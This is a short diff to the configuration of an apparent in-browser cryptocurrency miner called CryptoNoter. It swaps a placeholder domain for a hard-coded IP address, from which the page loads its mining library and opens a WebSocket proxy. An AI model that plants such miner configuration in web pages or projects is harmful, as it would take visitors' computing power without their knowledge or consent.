@@ -1,7 +1,7 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "http://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]]
+    LIB_URL: "http://46.101.40.29/lib/",
+    WEBSOCKET_SHARDS: [["wss://46.101.40.29/proxy"]]
 };
 var Module = {
     locateFile: (function (path) {
